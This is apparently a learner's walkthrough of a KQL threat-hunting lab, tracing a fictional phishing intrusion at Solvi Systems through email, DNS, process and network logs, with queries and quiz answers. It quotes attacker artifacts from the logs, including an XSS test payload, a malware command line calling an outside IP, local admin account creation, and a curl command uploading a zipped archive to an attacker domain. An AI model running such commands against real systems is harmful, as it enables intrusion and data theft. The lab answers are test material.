@@ -1,0 +1,381 @@
+Section 1 is KQL 101, which I believe I've already done some of from other modules, so it should be an easy start.
+How many employees work at Solvi Systems?
+Employees
+| count
+Answer: 500
+
+What is the CTO's name?
+Employees
+| where role == "CTO"
+Answer: Alexis Khoza
+
+How many emails did Alexis Khoza receive?
+Emails
+| where recipient == "alexis_khoza@solvisystems.com" //This was found from the previous query
+| count
+Answer: 31
+
+How many distinct senders were seen in the email logs from eskom.co.za?
+Email
+| where sender has "eskom.co.za"
+| distinct sender //This will show just the unique senders
+| count //And then this just counts them instead of showing all of them
+Answer: 745
+
+How many distinct websites did “Alexis Khoza” visit?
+OutboundNetworkEvents //A new table! This will just show traffic from Alexis's IP to the outside world
+| where src_ip == "10.10.0.7" //Gathered from the query 2 above
+| distinct url
+| count
+Answer: 72
+
+How many distinct domains in the PassiveDns records contain the word “real”?
+PassiveDns //Another new table. This one resolves DNS queries
+| where domain contains "real"
+| distinct domain
+| count 
+Answer: 19
+
+What IPs did the domain “bit.ly” resolve to (enter any one of them)?
+PassiveDns
+| where domain == "bit.ly"
+| distinct ip
+Answer: It says to pick any of them, so let's grab the first one - 219.82.23.42
+
+How many distinct URLs did employees with the first name "Mary" Visit?
+let mary_ips = 
+Employees
+| where name has "Mary"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (mary_ips)
+| distinct url
+| count 
+Ok, this introduces some new stuff. The first line is just defining what the variable mary_ips will be, which is followed by the clause querying the Employees table. That clause will be plugged in and used for the mary_ips variable later. Then, we search OutboundNetworkEvents to find source IPs (so, internal) that were distinct in the previous clause, gather the unique ones, and count them.
+Answer: 847
+
+How many authentication attempts did we see to the accounts of employees with the first name Mary?
+let auth_attempts = 
+Employees
+| where name has "Mary"
+| distinct username;
+AuthenticationEvents
+| where username in (auth_attempts)
+| count
+Answer: 1150
+That wasn't too bad. Onto the real investigation!
+
+
+Section 2: Someone's Knocking
+What kind of attack does the alert suggest happened?
+And the alert is:
+{
+   description: "DETECTION RULE TRIGGERED",
+   severity: "HIGH",
+   rule_description: "SUSPICIOUS TEXT IN HTTP REQUEST",
+   data: https://www.solvisystems.com/feedback?message=</script>. 
+ <script>alert('xss')</script>
+}
+This indicates XSS, or cross-site scripting. How do we know this? There's a script injected into the previously benign URL. Now, this script won't do much - just show a pop-up with the word 'xss', but it could be someone testing the waters to see what else they may be able to run.
+
+What javascript command was the attacker trying to run?
+And we are given:
+InboundNetworkEvents
+| where url contains "alert"
+That query will look for anything with the word "alert" from the outside world to the internal network. It returns one URL:
+https://www.solvisystems.com/feedback%3Fmessage%3D%3C/script%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
+Answer: alert
+
+What response code did they receive from the website?
+Using the previous query: 404
+
+What user agent did the attackers use to make the web requests in this attack? Enter only the initial part of the user agent (XXXXX/N.NN).
+Again, using the query 2 questions up: Opera/8.64
+
+On what day did the attack happen? Give the timestamp in the format YYYY-MM-DD.
+Still using that same query: 2024-05-03
+
+How many malicious requests did the attacker make in total?
+And we are given the template:
+InboundNetworkEvents
+| where user_agent == "<user_agent>"
+| where timestamp between (datetime("2024-05-03") .. datetime("2024-05-05"))
+Let's plug in the user agent (and change == to has) and run: 9
+
+Were any of these attacks successful? (yes/no)
+So for this, we're looking at the response codes. 404 is of course Not Found. Let's see if we get a success in any of those 9, which is code 200.
+And we do not.
+
+What IP addresses did the requests originate from? (Enter any of them.)
+Let's take the first result: 98.117.26.236
+
+How many total records do we have of them browsing Solvi Systems?
+Just take out the last line from the query 3 questions up: 64
+
+What is the timestamp of the first web request the threat actor sent to Solvi System's website?
+Make sure the table is sorted with the timestamps in ascending order: 2024-05-01T00:00:00.000Z
+
+Which product did the threat actors research before the day that they sent the malicious web requests?
+Let's add back in a timestamp clause, but adjust it to be a day before the prior request (and end on the day of):
+DOCKS ICS came up a few times
+
+How many distinct domains do the ip addresses used by the threat actor resolve to?
+let dist_ips = 
+InboundNetworkEvents
+| where user_agent has "Opera/8.64"
+| distinct src_ip;
+PassiveDns
+| where ip in (dist_ips)
+| distinct domain
+| count 
+This is what I used, so let's break this down. I made a variable for the distinct IP addresses seen in inbound network events. I gathered that information (the distinct IPs) by sorting by the user agent, which we know is the one the adversary is using, and gathering just the unique ones. Then, I go over to the DNS logs, and search for just those IPs. Then I filter by the unique domains returned and counted how many there are.
+Answer: 3
+
+Then we are told: Hmmm… These domains smell like they were registered for nefarious purposes. Perhaps for…phishing? Let's check out the email logs to confirm. Did we receive any emails containing these domains? (yes/no)
+From the previous query, if we remove the last line, we get these domains: energy-trends4u.net, news-on-industry.com, eco-awareness-update.net
+Let's plug those into a new query:
+Email
+| where link contains "energy-trends4u.net" or link contains "news-on-industry.com" or link contains "eco-awareness-update.net"
+Answer: yes, 56 in fact
+
+
+Section 3: Snail Mail
+How many emails associated with these domains did SolviSystem employees receive?
+Answer: Well, I got too eager I guess. I gave it away in the last answer.
+
+How many distinct email addresses did the threat actor use?
+Add this in to the end of the previous query:
+| distinct sender
+| count 
+Answer: 3
+
+How many distinct filenames were observed in the links in these emails?
+Admittedly, I had to look to the Discord for some assistance here. What I ended up with was:
+Email
+| where link contains "energy-trends4u.net" or link contains "news-on-industry.com" or link contains "eco-awareness-update.net"
+| extend urlpath = tostring(parse_url(link).Path)
+| extend urlfilename = tostring(parse_path(urlpath).Filename)
+| distinct urlfilename
+| count 
+Essentially, this will give us the links we need to look at first. Then, we are extending the table to include another column called urlpath. The results in this column will parse out the Path from the URLs, and then convert that information to a string. Then, we are extending again to have a column called urlfilename, which does a similar function but parses out the file names from the URLs. Then, we look for the unique ones and count them.
+Answer: 3
+
+How many different roles were targeted with these emails?
+Let's adjust the previous query just a touch:
+let phished =
+Email
+| where link contains "energy-trends4u.net" or link contains "news-on-industry.com" or link contains "eco-awareness-update.net"
+| extend urlpath = tostring(parse_url(link).Path)
+| extend urlfilename = tostring(parse_path(urlpath).Filename)
+| distinct recipient;
+Employees
+| where email_addr in (phished)
+| distinct role
+And this tells us there are 5 roles targeted.
+
+How many Customer Support Specialist employees received malicious emails?
+Let's change the last line to:
+| where role == "Customer Support Specialist"
+| count 
+Answer: 27
+
+Among these job roles, which word is shared by three of them?
+Let's take it back a couple steps to the one ending in "| distinct role"
+Answer: Docks
+
+What was the timestamp of the first email the threat actor sent?
+Let's get rid of most of this query now and keep:
+Email
+| where link contains "energy-trends4u.net" or link contains "news-on-industry.com" or link contains "eco-awareness-update.net"
+| extend urlpath = tostring(parse_url(link).Path)
+| extend urlfilename = tostring(parse_path(urlpath).Filename)
+Answer: 2024-05-01T15:51:41.000Z
+
+What is the recipient's email address?
+Use the same result: carla_wharton@solvisystems.com
+
+What is that employee's name?
+Well, we can assume it's Carla Wharton based on the email address.
+
+What was the sender address of that email?
+news@eco-awareness-updates.net
+
+What was the reply to address?
+electric_updates@gmail.com
+Well, that's suspicious! The sender and reply-to should (usually) be the same if it was legitimate.
+
+What was the subject of that email?
+[EXTERNAL] Business Opportunity: Two major energy companies merging
+
+What link was observed in the email?
+http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx
+
+Did Carla click on the link in email? If so when?
+To do this, let's go grab Carla's IP: 10.10.0.164
+Then, let's check OutboundNetworkEvents:
+OutboundNetworkEvents
+| where url == "http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx"
+| where src_ip == "10.10.0.164"
+Answer: yes :( 2024-05-01T15:57:41.000Z
+
+What file was observed on Carla's machine shortly after she executed the docx file?
+Back to querying for Carla's information - we find that her hostname is JUSP-LAPTOP
+Then we check for FileCreationEvents:
+FileCreationEvents
+| where hostname == "JUSP-LAPTOP"
+| where timestamp > datetime(2024-05-01T15:57:41.000Z)
+The last line gives us results where the events occured AFTER the timestamp of Carla clicking the link.
+Answer: ecobug.exe
+
+What was the hash of the file?
+1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252
+
+
+Section 4: Ecoshock
+How many records do we have of this file being created on Solvi Systems computers?
+FileCreationEvents
+| where filename == "ecobug.exe"
+Answer: 39
+
+Let's go back and look at the process events on Carla's machine to see what happens after ecobug.exe is created. What IP address does ecobug.exe connect to in order to establish persistence?
+OutboundNetworkEvents
+| where src_ip == "10.10.0.164"
+| where timestamp > datetime(2024-05-01T15:59:25.000Z)
+This shows us outbound traffic from Carla's machine after the exe was installed.
+Answer: 10.10.0.164
+
+What IP address does ecobug.exe connect to in order to establish persistence?
+Let's go to a different table:
+ProcessEvents
+| where hostname == "JUSP-LAPTOP"
+| where process_commandline contains "ecobug.exe"
+Our second result is: ecobug.exe --timeout 6000 --dest 98.117.26.236 --port 1337
+Answer: 98.117.26.236
+
+What is the port number that is used?
+See above: 1337
+
+How many times does Carla's machine connect to the suspicious IP address?
+It tells us to check the NetworkFlow table, so let's try:
+NetworkFlow
+| where src_ip == "10.10.0.164
+| where dest_ip == "98.117.26.236"
+Answer: 24
+
+How many times a day does Carla's machine make its recurring connection to the suspicious IP?
+If we look at the timestamps of the results from the previous query, it appears to only reach out once a day.
+
+At what time does this connection take place? (format hh:mm:ss)
+17:38:25
+
+How many total connections do we see between this IP and Solvi Systems employee machines?
+Let's get rid of line 2 in the prior query: 470
+
+How many distinct employee machines are involved in those connections?
+Let's try filtering out unique source (internal) IPs and counting them:
+NetworkFlow
+| where dest_ip == "98.117.26.236"
+| distinct src_ip
+| count
+Answer: 38
+
+A day after the malware is first executed the threat actor attempts to create a new user and add that user to the local administrators group. What is the name of the newly created user?
+This required a bit of prior knowledge. I know that, to add a new user on Windows via command line, you have to user "net user". Let's try filtering that out in the ProcessEvents:
+ProcessEvents
+| where process_commandline contains "net user"
+Answer: gu@rd!an
+
+What is that user's password?
+Also shown in the same query result: abc1toothree
+
+What was the last discovery command that the adversaries ran?
+Let's try something like:
+ProcessEvents
+| where hostname == "JUSP-LAPTOP"
+| where timestamp > datetime(2024-05-01T15:59:25.000Z)
+Sort so the newest commands are at the top and we see (way down): net use
+
+
+Section 5: A Shocking Ending
+How many distinct commands containing the term net use were run on SolviSystem devices?
+ProcessEvents
+| where process_commandline has "net use" //We use "has" for a complete word, while "contains" would also show things like "net user"
+| distinct process_commandline
+Answer: 2
+
+What new command using net use did we find?
+net use /PERSISTENT:YES
+
+How many distinct hosts was this command run on?
+ProcessEvents
+| where process_commandline == "net use /PERSISTENT:YES" //We are now looking for this EXACT command
+| distinct hostname
+Answer: 3
+
+What is the timestamp for the first time this command was run?
+Remove that last line from the previous query this time and: 2024-05-27T16:23:10.000Z
+
+What is the hostname from that timestamp?
+SJ9V-MACHINE
+
+Who is the employee associated with that hostname?
+We see the username associated: alpetrov
+Let's plug that into the Employees table:
+Employees
+| where username == "alpetrov"
+Answer: Alexei Petrov
+
+What is that employee's role?
+Docks Customer Success Manager
+
+Now let's go back and see if there were other commands run on Alexei's machine after net use /PERSISTENT:YES. It looks like the adversary was copying files from a network share onto Alexei's machine. What is the command used to copy files related to SoftwareDevelopment?
+I used:
+ProcessEvents
+| where hostname == "SJ9V-MACHINE"
+| where process_commandline contains "SoftwareDevelopment"
+And the only result is: Copy-Item -Path \\\\solvisystems.com\\SharedDocs\\SoftwareDevelopment\\CycleDocuments\\* -Destination C:\\Users\\alpetrov\\CollectedData\\Software_Cycle_Docs
+
+After collecting the sensentive data, the adversary compressed it and moved it to another location. What is the name of the archive file containing the copied documents?
+Let's take the timestamp from the previous command: 2024-05-27T17:11:58.000Z
+Then try this:
+ProcessEvents
+| where hostname == "SJ9V-MACHINE"
+| where timestamp > datetime(2024-05-27T17:11:58.000Z)
+And the first result shows: Compress-Archive -Path C:\Users\alpetrov\CollectedData\* -DestinationPath C:\DataExfil\CollectedData.zip
+Answer: CollectedData.zip
+
+The next day the data was exfiltrated using what command?
+I did this to narrow down the commands only to the ones between the time copying (on the 27th) and midnight on the 29th:
+ProcessEvents
+| where hostname == "SJ9V-MACHINE"
+| where timestamp between (datetime("2024-05-27T17:11:58.000Z") .. datetime("2024-05-29T00:00:00.00Z"))
+Down just a little bit we see: curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload
+
+How many accounts were used by the threat actor to exfiltrate sensitive information from Solvi Systems?
+I ran:
+ProcessEvents
+| where process_commandline contains "https://api.eco-awareness-update.net/upload"
+| distinct username
+Answer: 3
+
+The threat actors were observed reading an "internal process" document from an internal portal called ____.solvisystems.com
+I used:
+InboundNetworkEvents
+| where url contains ".solvisystems.com"
+| where url !contains "www.solvisystems.com" //This piece is because I originally tried without it and got a lot of noise. This filters out to just show URLs with something between the www. and solvisystems.com
+Answer: devportal
+
+The adversaries also tried going an unconventional route and simply asking nicely 🤣 for details about the SDLC using the compromised user's accounts. These compromised users sent a few emails prodding for information about the location of important software documentation. What was the subject of those emails?
+Ok, from the previous query, let's find the timestamps of the first and last devportal inbound network events.
+2024-05-27T17:14:46.000 & 2024-05-29T14:45:39.000Z
+Let's keep that last timestamp and go back a little bit on the first one, in case these emails happened earlier (which they likely did).
+Let's also go grab the email addresses from the query 2 up, which would show us the compromised accounts: alpetrov, jalee, tagreen
+Translate those to their email addresses: alexei_petrov@solvisystems.com, jamie_lee@solvisystems.com, taylor_green@solvisystems.com
+So now our query looks like this:
+Email
+| where timestamp between (datetime(2024-05-01T17:14:46.000) .. datetime(2024-05-29T14:45:39.000) )
+| where sender == "alexei_petrov@solvisystems.com" or sender == "jamie_lee@solvisystems.com" or sender == "taylor_green@solvisystems.com"
+| where subject has "Documentation"
+| distinct subject
+We get 2 results, let's try both: Urgent Request: DOCKS System Documentation 🚨
+Do you know where the DOCKS software documentation is stored? 🤪
